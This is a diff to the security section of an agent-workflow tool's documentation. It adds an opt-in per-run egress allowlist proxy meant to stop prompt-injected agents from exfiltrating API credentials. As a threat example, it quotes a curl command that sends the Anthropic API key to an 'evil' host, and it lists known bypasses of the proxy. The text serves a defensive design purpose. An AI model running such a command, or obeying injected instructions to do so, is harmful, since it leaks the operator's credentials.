@@ -176,11 +176,50 @@ writable state confined to named volumes and a `/tmp` tmpfs. Treat the
 container as the containment unit for the untrusted code a run executes, and
 do not bind-mount host directories into it by default.
 
-**Known gap — per-run network isolation.** The container itself needs egress
-(provider APIs, webhook responses), so it cannot run `--network none`.
-Isolating an *individual agent run's* network requires nested sandboxing and
-is not yet implemented. Until it is: run Infinite Loop on a network it should
-not be able to abuse, and review the workflows you run.
+The container needs egress (provider APIs, webhook responses), so it cannot
+run `--network none`. To bound an *individual agent run's* network, see the
+per-run egress allowlist below.
+
+### Per-run egress allowlist
+
+An Agent node spawns a provider CLI that runs untrusted, prompt-shaped code
+with a real API credential in its environment — the manifest's `envPassthrough`
+(`ANTHROPIC_*`, `OPENAI_*`), which scrubbing cannot strip without breaking the
+provider. The risk is **exfiltration**: a prompt-injected agent running
+`curl https://evil/ -d "$ANTHROPIC_API_KEY"`.
+
+A CLI provider manifest can declare an **`egressAllowlist`** — the hostnames
+its child legitimately needs, each an exact host or a leading-wildcard
+(`*.anthropic.com`, matching any subdomain but **not** the apex). When the
+operator sets **`INFLOOP_EGRESS_ENFORCE=1`**, the runner starts a per-run
+filtering proxy bound to loopback, points the child's `HTTP(S)_PROXY` at it,
+and the proxy permits CONNECT tunnels and plain-HTTP forwards **only** to
+allowlisted hosts — everything else is refused with `403` and logged. The
+proxy also resolves each host itself and refuses one that resolves to a
+loopback, private, or link-local address (a DNS-rebinding / SSRF guard, so it
+cannot be turned into a pivot to an internal service or a cloud metadata
+endpoint) unless that exact IP is itself an allowlist entry. If the proxy
+cannot start, the run **fails closed** rather than running unrestricted. The
+shipped `claude` and `codex` manifests already declare allowlists for their
+provider APIs.
+
+This is **opt-in and off by default**: with `INFLOOP_EGRESS_ENFORCE` unset,
+children spawn exactly as before. The exact endpoint set a CLI needs varies by
+version, so enable enforcement deliberately and extend the allowlist for your
+setup.
+
+**What it is and isn't** — it catches every standard HTTP client that honours
+`HTTP(S)_PROXY` (curl, wget, the provider CLIs, Python `requests`). It is
+defense-in-depth, not a jail:
+
+- Raw-socket code that ignores proxy env vars bypasses it.
+- It does not stop exfiltration to an *allowlisted* host — an attacker can
+  encode the key into a request to `api.anthropic.com` itself. It removes the
+  *arbitrary-endpoint* channel and forces an attacker onto hosts you chose.
+- It assumes direct outbound; chaining to a mandatory upstream corporate proxy
+  is not supported.
+
+For a stronger boundary, also run Infinite Loop on a network it cannot abuse.
 
 ### Per-run worktree isolation
 
